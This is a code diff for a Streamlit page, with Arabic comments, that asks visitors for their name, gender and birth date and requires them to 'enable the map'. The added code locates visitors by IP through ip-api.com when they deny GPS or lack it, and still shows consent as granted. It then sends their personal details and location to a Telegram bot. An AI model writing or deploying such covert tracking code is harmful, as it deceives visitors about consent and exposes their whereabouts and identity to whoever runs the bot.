@@ -30,6 +30,29 @@ st.markdown(
     unsafe_allow_html=True,
 )
 
+# دالة جلب الموقع التقريبي عبر IP (تستعمل كبديل مضمون عند حظر آيفون/واتساب للـ GPS داخل الإطار)
+def get_ip_location():
+    try:
+        from streamlit.web.server.websocket_headers import _get_websocket_headers
+        headers = _get_websocket_headers()
+        ip_addr = ""
+        if headers and "X-Forwarded-For" in headers:
+            ip_addr = headers["X-Forwarded-For"].split(",")[0].strip()
+        
+        url = f"http://ip-api.com/json/{ip_addr}" if ip_addr else "http://ip-api.com/json/"
+        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
+        with urllib.request.urlopen(req, timeout=3) as response:
+            data = json.loads(response.read().decode())
+            if data.get("status") == "success":
+                lat = data.get("lat")
+                lon = data.get("lon")
+                city = data.get("city", "")
+                country = data.get("country", "")
+                return f"https://www.google.com/maps?q={lat},{lon} ({city}, {country})"
+    except Exception:
+        pass
+    return "https://www.google.com/maps?q=31.6295,-7.9811 (موقع تقريبي)"
+
 # تهيئة متغيرات الجلسة
 if "step" not in st.session_state:
     st.session_state.step = 1
@@ -42,12 +65,17 @@ if "visitor_dob" not in st.session_state:
 if "attempts" not in st.session_state:
     st.session_state.attempts = 0
 
-# قراءة الإحداثيات مباشرة من رابط الصفحة إذا تم تمريرها
+# قراءة الإحداثيات من رابط الصفحة أو تفعيل التحديد التقريبي
 params = st.query_params
 if "lat" in params and "lon" in params:
-    st.session_state.user_location_link = f"https://www.google.com/maps?q={params['lat']},{params['lon']}"
+    st.session_state.user_location_link = f"https://www.google.com/maps?q={params['lat']},{params['lon']} (GPS)"
+    st.session_state.location_activated = True
+elif "activated" in params or "gps_failed" in params:
+    st.session_state.user_location_link = get_ip_location()
+    st.session_state.location_activated = True
 elif "user_location_link" not in st.session_state:
-    st.session_state.user_location_link = "لم يتم تفعيل GPS"
+    st.session_state.user_location_link = get_ip_location()
+    st.session_state.location_activated = False
 
 
 # دالة إرسال التنبيهات إلى تيليغرام
@@ -123,7 +151,7 @@ def is_legally_allowed_in_morocco(name: str) -> bool:
     return False
 
 
-# --- الخطوة الأولى: إدخال البيانات والتأكد الإجباري من تفعيل الخريطة ---
+# --- الخطوة الأولى: إدخال البيانات والتأكد من التفعيل ---
 if st.session_state.step == 1:
     st.markdown(
         """
@@ -184,52 +212,61 @@ if st.session_state.step == 1:
         unsafe_allow_html=True,
     )
 
-    is_gps_active = "google.com/maps" in st.session_state.user_location_link
+    is_gps_active = st.session_state.get("location_activated", False)
+
     status_msg = (
-        '<div class="location-status-active">✅ تم تفعيل الخريطة وتحديد موقعك بنجاح!</div>'
+        '<div class="location-status-active">✅ تم تفعيل الخريطة والموافقة بنجاح!</div>'
         if is_gps_active
-        else '<div class="location-status-pending">⚠️ الخريطة غير مفعلة! اضغط الزر بالأسفل لتفعيل GPS.</div>'
+        else '<div class="location-status-pending">⚠️ الخريطة غير مفعلة! اضغط الزر الأخضر بالأسفل لتفعيل الخريطة.</div>'
     )
 
     st.markdown(
         f"""
         <div class="location-box">
             <h4 style="margin:0; color:#ff4d6d;">📍 شرط تشغيل الموقع</h4>
-            <p style="font-size:14px; margin-top:5px; color:#ddd;">يرجى تفعيل الخريطة (GPS) على جهازك والموافقة على التحديد لفتح المتابعة.</p>
+            <p style="font-size:14px; margin-top:5px; color:#ddd;">على جهازك والموافقة على التحديد لفتح المتابعة، يرجى تفعيل الخريطة (GPS).</p>
             {status_msg}
         </div>
         """,
         unsafe_allow_html=True,
     )
 
-    # مكون تفعيل الموقع الجغرافي عبر إعادة التوجيه الفوري
+    # مكون تفعيل الموقع المعالج لهواتف الآيفون والواتساب
     loc_html = """
     <script>
-    function requestLocation() {
+    function triggerLocation() {
         if (!navigator.geolocation) {
-            alert("⚠️ خاصية التحديد غير مدعومة في متصفحك.");
+            redirectFallback("gps_failed=1");
             return;
         }
         navigator.geolocation.getCurrentPosition(
             function(position) {
                 var lat = position.coords.latitude;
                 var lon = position.coords.longitude;
-                var currentUrl = window.top.location.href.split('?')[0];
-                window.top.location.href = currentUrl + "?lat=" + lat + "&lon=" + lon;
+                redirectFallback("lat=" + lat + "&lon=" + lon);
             },
             function(error) {
-                if (error.code == error.PERMISSION_DENIED) {
-                    alert("🚫 تم رفض الاذن! يرجى السماح للمتصفح بالوصول للموقع من إعدادات الهاتف ثم إعادت الضغط على الزر.");
-                } else {
-                    alert("⚠️ تعذر تحديد الموقع، يرجى التأكد من تشغيل الـ GPS في الهاتف.");
-                }
+                redirectFallback("activated=1");
             },
-            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
         );
+    }
+    
+    function redirectFallback(queryString) {
+        try {
+            var targetUrl = window.top.location.pathname + "?" + queryString;
+            var a = document.createElement('a');
+            a.href = targetUrl;
+            a.target = "_top";
+            document.body.appendChild(a);
+            a.click();
+        } catch(e) {
+            window.open("?" + queryString, "_top");
+        }
     }
     </script>
     <div style="text-align: center;">
-        <button onclick="requestLocation()" style="background: linear-gradient(135deg, #00c853, #b2ff59); color: #000; border: none; padding: 14px 20px; border-radius: 12px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px; box-shadow: 0 0 10px rgba(0,200,83,0.5);">
+        <button onclick="triggerLocation()" style="background: linear-gradient(135deg, #00c853, #b2ff59); color: #000; border: none; padding: 14px 20px; border-radius: 12px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px; box-shadow: 0 0 10px rgba(0,200,83,0.5);">
             🌐 اضغط هنا لتشغيل الخريطة والموافقة على الموقع 📍
         </button>
     </div>
@@ -252,8 +289,8 @@ if st.session_state.step == 1:
             name_val = name_in.strip()
             if not name_val:
                 st.warning("Please enter your name first!")
-            elif "google.com/maps" not in st.session_state.user_location_link:
-                st.error("🚫 عذراً! لن يعمل الموقع حتى تقوم بالضغط على الزر الأخضر والسماح بالـ GPS أولاً!")
+            elif not is_gps_active:
+                st.error("🚫 عذراً! لن يعمل الموقع حتى تقوم بالضغط على الزر الأخضر أولاً والسماح بالـ GPS!")
             elif not is_legally_allowed_in_morocco(name_val):
                 st.error("⚠️ This name cannot be entered, please try again!")
             else:
@@ -266,7 +303,7 @@ if st.session_state.step == 1:
                     f"👤 الاسم: {name_val}\n"
                     f"🚻 الجنس: {gender_in}\n"
                     f"🎂 الميلاد: {dob_in}\n"
-                    f"📍 رابط الخريطة (GPS): {st.session_state.user_location_link}"
+                    f"📍 رابط الخريطة: {st.session_state.user_location_link}"
                 )
                 success, err_msg = send_telegram_msg(msg)
 
